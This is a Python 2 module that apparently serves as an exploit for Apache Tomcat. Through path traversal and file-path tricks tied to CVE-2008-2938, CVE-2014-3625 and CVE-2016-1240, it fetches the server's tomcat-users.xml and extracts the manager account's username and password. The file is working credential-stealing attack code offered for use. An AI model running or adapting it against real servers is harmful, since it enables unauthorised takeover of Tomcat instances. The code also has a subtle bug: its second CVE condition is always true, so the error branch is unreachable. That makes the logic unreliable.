import urllib2 as web
import xml.etree.ElementTree as ElementTree

import database

def get_tomcatusersxml(ip, cve):
    if cve == "CVE-2008-2938":
        response = web.urlopen("http://"+ip+"/"+database.DOT_DOT+"/"+database.DOT_DOT+"/conf/tomcat-users.xml").read()
    elif cve == "CVE-2014-3625" or "CVE-2016-1240":
        response = web.urlopen("http://"+ip+"/resources/file:var/lib/tomcat7/conf/tomcat-users.xml").read()
    else:
        raise KeyError

    return ElementTree.fromstring(response)

def find_manager(tree):
    users = tree.iterfind("user[@roles]")

    for user in users:
        roles = user.attrib["roles"].split(",")
        for role in roles:
            if role.strip() == "manager":
                return (user.attrib["username"], user.attrib["password"])

    raise KeyError
